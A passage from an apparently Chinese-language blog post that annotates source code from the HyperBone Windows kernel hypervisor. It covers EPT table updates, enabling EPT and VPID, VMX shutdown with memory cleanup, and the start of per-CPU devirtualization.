(EPT_TABLE_ENTRIES - <span class="number">1</span>)) );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*for (ULONG64 pfn = 0; pfn &lt;= 0xFEE00; pfn += EPT_TABLE_ENTRIES, hostPFN += EPT_TABLE_ENTRIES)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (!NT_SUCCESS( EptUpdateTableRecursive( PML4Ptr, 3, pfn, EPT_ACCESS_ALL, hostPFN, EPT_TABLE_ENTRIES ) ))</span></span><br><span class="line"><span class="comment">            return STATUS_UNSUCCESSFUL;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归更新EPT表项"><a href="#递归更新EPT表项" class="headerlink" title="-递归更新EPT表项"></a>-递归更新EPT表项</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Update EPT entry</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPTData&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pTable&quot;&gt;EPT table&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;level&quot;&gt;EPT table level&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pfn&quot;&gt;Page frame number to update&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;access&quot;&gt;New PFN access&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;hostPFN&quot;&gt;New hot PFN&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;count&quot;&gt;Number of entries to update&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptUpdateTableRecursive</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    IN PEPT_DATA pEPTData,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PEPT_MMPTE pTable,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN EPT_TABLE_LEVEL level,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG64 pfn,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN UCHAR access,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG64 hostPFN,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG count</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (level == EPT_LEVEL_PTE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// PTE表示已递归到最底层</span></span><br><span class="line">        <span class="comment">// 避免越界</span></span><br><span class="line">        ULONG64 first = <span class="built_in">EptpTableOffset</span>( pfn, level );</span><br><span class="line">        <span class="built_in">ASSERT</span>( first + count &lt;= EPT_TABLE_ENTRIES );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据访问权限设置对应字段</span></span><br><span class="line">        PEPT_PTE_ENTRY pPTE = (PEPT_PTE_ENTRY)pTable;</span><br><span class="line">        <span class="keyword">for</span> (ULONG64 i = first; i &lt; first + count; i++, hostPFN++)        </span><br><span class="line">        &#123;</span><br><span class="line">            pPTE[i].Fields.Read       = (access &amp; EPT_ACCESS_READ)  != <span class="number">0</span>;</span><br><span class="line">            pPTE[i].Fields.Write      = (access &amp; EPT_ACCESS_WRITE) != <span class="number">0</span>;</span><br><span class="line">            pPTE[i].Fields.Execute    = (access &amp; EPT_ACCESS_EXEC)  != <span class="number">0</span>;</span><br><span class="line">            pPTE[i].Fields.MemoryType = VMX_MEM_TYPE_WRITEBACK;</span><br><span class="line">            pPTE[i].Fields.PhysAddr   = hostPFN;<span class="comment">// 物理地址字段为hostPFN</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ULONG64 offset = <span class="built_in">EptpTableOffset</span>( pfn, level );<span class="comment">// 计算要更新的 EPT 表项在指定表中的偏移量</span></span><br><span class="line">    PEPT_MMPTE pEPT = &amp;pTable[offset];<span class="comment">// 要更新的 EPT 表中的具体表项</span></span><br><span class="line">    PEPT_MMPTE pNewEPT = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;Fields.PhysAddr == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 表示该表项未分配页面，需要分配一个页面</span></span><br><span class="line">        pNewEPT = (PEPT_MMPTE)<span class="built_in">EptpAllocatePage</span>( pEPTData );</span><br><span class="line">        <span class="keyword">if</span> (pNewEPT == <span class="literal">NULL</span>)          </span><br><span class="line">            <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">        <span class="comment">// 设置表示存在，可写，可执行和物理地址</span></span><br><span class="line">        pEPT-&gt;Fields.Present  = <span class="number">1</span>;</span><br><span class="line">        pEPT-&gt;Fields.Write    = <span class="number">1</span>;</span><br><span class="line">        pEPT-&gt;Fields.Execute  = <span class="number">1</span>;</span><br><span class="line">        pEPT-&gt;Fields.PhysAddr = <span class="built_in">PFN</span>( <span class="built_in">MmGetPhysicalAddress</span>( pNewEPT ).QuadPart );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 表示该表项已分配页面，通过物理地址获取其虚拟地址</span></span><br><span class="line">        PHYSICAL_ADDRESS phys = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        phys.QuadPart = pEPT-&gt;Fields.PhysAddr &lt;&lt; <span class="number">12</span>;</span><br><span class="line">        pNewEPT = <span class="built_in">MmGetVirtualForPhysical</span>( phys );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">EptUpdateTableRecursive</span>( pEPTData, pNewEPT, level - <span class="number">1</span>, pfn, access, hostPFN, count );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="–计算-EPT-表项索引（Table-Index）"><a href="#–计算-EPT-表项索引（Table-Index）" class="headerlink" title="–计算 EPT 表项索引（Table Index）"></a>–计算 EPT 表项索引（Table Index）</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// EPT entry index in table</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pfn&quot;&gt;EPT PFN&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;level&quot;&gt;EPT level&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Table index&lt;/returns&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ULONG64 <span class="title">EptpTableOffset</span><span class="params">( IN ULONG64 pfn, IN CHAR level )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    首先定义一个掩码（mask），用于提取指定层级的表项索引。</span></span><br><span class="line"><span class="comment">    这里使用位运算来生成掩码，具体生成方式为 1 左移 ((level + 1) * EPT_TABLE_ORDER) 位，然后减去 1，</span></span><br><span class="line"><span class="comment">    得到了一个所有位都置为 1 的掩码。</span></span><br><span class="line"><span class="comment">    将掩码与 PFN 进行按位与操作，目的是提取出指定层级的表项索引。</span></span><br><span class="line"><span class="comment">    按位与操作会将掩码中相应位为 0 的位置上的 PFN 位也设置为 0，从而提取出表项索引。</span></span><br><span class="line"><span class="comment">    最后，将提取出的表项索引右移 (level * EPT_TABLE_ORDER) 位，将其放置在正确的位置上，并作为函数返回值。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ULONG64 mask = (<span class="number">1ULL</span> &lt;&lt; ((level + <span class="number">1</span>) * EPT_TABLE_ORDER)) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (pfn &amp; mask) &gt;&gt; (level * EPT_TABLE_ORDER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="在CPU上开启EPT"><a href="#在CPU上开启EPT" class="headerlink" title="在CPU上开启EPT"></a>在CPU上开启EPT</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Enable EPT for CPU</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;PML4&quot;&gt;PML4 pointer to use&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">EptEnable</span><span class="params">( IN PEPT_PML4_ENTRY PML4 )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    基本CPU执行控制是一组CPU执行控制位，用于控制处理器在VMX操作期间的行为。</span></span><br><span class="line"><span class="comment">    这些控制位包括启用VMX操作、允许或阻止对VMCS的加载或存储、中断虚拟化、启用或禁用NMI虚拟化、</span></span><br><span class="line"><span class="comment">    读取或屏蔽虚拟-NMI信息等。这些控制位可通过VMXON指令设置，</span></span><br><span class="line"><span class="comment">    也可以通过VMClear和VMLaunch指令清除并重新加载来更新。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    二级CPU执行控制是一组掩码，用于启用或禁用一组次要的、特殊的、可选的处理器功能。</span></span><br><span class="line"><span class="comment">    这些控制位包括启用或禁用EPT、启用或禁用VPID、启用或禁用虚拟处理器退出控制、启用或禁用VMFUNC指令、</span></span><br><span class="line"><span class="comment">    CR3传递、IO位图中断虚拟化、APIC虚拟化等。</span></span><br><span class="line"><span class="comment">    这些控制位可以通过设置MSR IA32_VMX_PROCBASED_CTLS2寄存器来更新。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    VMX_CPU_BASED_CONTROLS primary = &#123; <span class="number">0</span> &#125;;<span class="comment">// 基本CPU执行控制</span></span><br><span class="line">    VMX_SECONDARY_CPU_BASED_CONTROLS secondary = &#123; <span class="number">0</span> &#125;;<span class="comment">// 二级CPU执行控制</span></span><br><span class="line">    EPT_TABLE_POINTER EPTP = &#123; <span class="number">0</span> &#125;;<span class="comment">// EPT指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取相应寄存器的值</span></span><br><span class="line">    __vmx_vmread( SECONDARY_VM_EXEC_CONTROL, (<span class="type">size_t</span>*)&amp;secondary.All );</span><br><span class="line">    __vmx_vmread( CPU_BASED_VM_EXEC_CONTROL, (<span class="type">size_t</span>*)&amp;primary.All );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置EPTP（EPT表指针）的字段值。</span></span><br><span class="line">    <span class="comment">// 将EPTP的物理地址字段设置为PML4的物理地址（MmGetPhysicalAddress(PML4)），并将其右移12位（相当于除以4096），</span></span><br><span class="line">    <span class="comment">// 以获取正确的页帧号。将页表的长度设置为3，表示EPT有4级表（PML4、PDPT、PD和PT）。</span></span><br><span class="line">    EPTP.Fields.PhysAddr = <span class="built_in">MmGetPhysicalAddress</span>( PML4 ).QuadPart &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    EPTP.Fields.PageWalkLength = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将EPTP的值写入EPT_POINTER VMCS字段中，以启用EPT。</span></span><br><span class="line">    __vmx_vmwrite( EPT_POINTER, EPTP.All );</span><br><span class="line">    <span class="comment">// 将虚拟处理器标识符（VPID）写入VMCS中，以启用VPID。</span></span><br><span class="line">    __vmx_vmwrite( VIRTUAL_PROCESSOR_ID, VM_VPID );</span><br><span class="line"></span><br><span class="line">    primary.Fields.ActivateSecondaryControl = TRUE;<span class="comment">// 激活二级CPU执行控制</span></span><br><span class="line">    secondary.Fields.EnableEPT = TRUE;<span class="comment">// 启用EPT</span></span><br><span class="line">    <span class="keyword">if</span>(g_Data-&gt;Features.VPID)</span><br><span class="line">        secondary.Fields.EnableVPID = TRUE;<span class="comment">// 启用VPID</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将更新后的值写入VMCS中</span></span><br><span class="line">    __vmx_vmwrite( SECONDARY_VM_EXEC_CONTROL, secondary.All );</span><br><span class="line">    __vmx_vmwrite( CPU_BASED_VM_EXEC_CONTROL, primary.All );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 刷新EPT上下文，并从ctx拿到上下文信息</span></span><br><span class="line">    EPT_CTX ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    __invept( INV_ALL_CONTEXTS, &amp;ctx );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DPRINT( &quot;HyperBone: CPU %d: %s: EPT enabled\n&quot;, CPU_NUM, __FUNCTION__ );</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="刷新EPT上下文"><a href="#刷新EPT上下文" class="headerlink" title="刷新EPT上下文"></a>刷新EPT上下文</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__invept PROC</span><br><span class="line">    invept rcx, OWORD PTR [rdx]</span><br><span class="line">    ret</span><br><span class="line">__invept ENDP</span><br></pre></td></tr></table></figure><h3 id="AMD-CPU-不支持"><a href="#AMD-CPU-不支持" class="headerlink" title="AMD CPU 不支持"></a>AMD CPU 不支持</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">AMDSubvertCPU</span><span class="params">( IN PVCPU Vcpu, IN PVOID arg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Vcpu );</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( arg );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: AMD-V not yet supported\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="释放IntelCPU"><a href="#释放IntelCPU" class="headerlink" title="释放IntelCPU"></a>释放IntelCPU</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">IntelRestoreCPU</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Prevent execution of VMCALL on non-vmx CPU</span></span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VmxState &gt; VMX_STATE_OFF)</span><br><span class="line">        <span class="built_in">VmxShutdown</span>( Vcpu );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="从根模式切换回非根模式"><a href="#从根模式切换回非根模式" class="headerlink" title="从根模式切换回非根模式"></a>从根模式切换回非根模式</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Revert CPU to non-root mode</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxShutdown</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//DPRINT( &quot;HyperBone: CPU %d: %s: CR3 load count %d\n&quot;, CPU_IDX, __FUNCTION__, Vcpu-&gt;Cr3Loads );</span></span><br><span class="line"></span><br><span class="line">    __vmx_vmcall( HYPERCALL_UNLOAD, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> );<span class="comment">// 通知VMM卸载所加载的虚拟机</span></span><br><span class="line">    <span class="built_in">VmxVMCleanup</span>( KGDT64_R3_DATA | RPL_MASK, KGDT64_R3_CMTEB | RPL_MASK );<span class="comment">// 清除VMX相关设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放EPT的身份映射</span></span><br><span class="line">    <span class="built_in">EptFreeIdentityMap</span>( &amp;Vcpu-&gt;EPT );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放数据结构VMXON、VMCS和VMM堆栈内存</span></span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMXON)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMXON );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMCS)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMCS );</span><br><span class="line">    <span class="keyword">if</span> (Vcpu-&gt;VMMStack)</span><br><span class="line">        <span class="built_in">MmFreeContiguousMemory</span>( Vcpu-&gt;VMMStack );</span><br><span class="line"></span><br><span class="line">    Vcpu-&gt;VMXON = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMCS = <span class="literal">NULL</span>;</span><br><span class="line">    Vcpu-&gt;VMMStack = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通知VMM"><a href="#通知VMM" class="headerlink" title="通知VMM"></a>通知VMM</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__vmx_vmcall PROC</span><br><span class="line">    vmcall</span><br><span class="line">    ret</span><br><span class="line">__vmx_vmcall ENDP</span><br></pre></td></tr></table></figure><h5 id="清除VMX相关设置"><a href="#清除VMX相关设置" class="headerlink" title="清除VMX相关设置"></a>清除VMX相关设置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VmxVMCleanup PROC</span><br><span class="line">    mov     ds, cx              ; set DS to parameter 1</span><br><span class="line">    mov     es, cx              ; set ES to parameter 1</span><br><span class="line">    mov     fs, dx              ; set FS to parameter 2</span><br><span class="line">    ret                         ; return</span><br><span class="line">VmxVMCleanup ENDP</span><br></pre></td></tr></table></figure><h5 id="释放EPT的身份映射"><a href="#释放EPT的身份映射" class="headerlink" title="释放EPT的身份映射"></a>释放EPT的身份映射</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Release Guest to Host page mappings</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptFreeIdentityMap</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查PML4表是否为空</span></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;PML4Ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放PML4表</span></span><br><span class="line">    pEPT-&gt;PML4Ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 循环释放EPT页链表中每个表项的所有页面</span></span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">IsListEmpty</span>( &amp;pEPT-&gt;PageList ))</span><br><span class="line">    &#123;</span><br><span class="line">        PLIST_ENTRY pListEntry = pEPT-&gt;PageList.Flink;</span><br><span class="line">        <span class="comment">// 获取列表入口的地址 从结构的成员指针得到结构的起始地址</span></span><br><span class="line">        PEPT_PAGES_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, EPT_PAGES_ENTRY, link );</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pEntry-&gt;count; i++)</span><br><span class="line">            <span class="comment">// 释放表项的每个页面</span></span><br><span class="line">            <span class="keyword">if</span> (pEntry-&gt;pages[i] != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">MmFreeContiguousMemory</span>( pEntry-&gt;pages[i] );</span><br><span class="line">        <span class="comment">// 移除当前表项，并释放内存空间</span></span><br><span class="line">        <span class="built_in">RemoveEntryList</span>( pListEntry );</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pListEntry, HB_POOL_TAG );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 表示释放了预分配的内存空间</span></span><br><span class="line">    pEPT-&gt;Preallocations = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AMD不支持"><a href="#AMD不支持" class="headerlink" title="AMD不支持"></a>AMD不支持</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> VOID <span class="title">AMDRestoreCPU</span><span class="params">( IN PVCPU Vcpu )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>( Vcpu );</span><br><span class="line">    <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: AMD-V not yet supported\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="停止虚拟化"><a href="#停止虚拟化" class="headerlink" title="停止虚拟化"></a>停止虚拟化</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Devirtualize each CPU</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">StopHV</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Unknown CPU</span></span><br><span class="line"><span class="keyword">if</span> (g_Data-&gt;CPUVendor == CPU_Other)</span><br><span class="line"><span class="keyword">return</span> STATUS_NOT_SUPPORTED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果在当前的上下文中调用 KeGenericCallDpc 并将当前线程切换到另一个处理器上执行回调函数，可能会导致死锁。</span></span><br><span class="line"><span 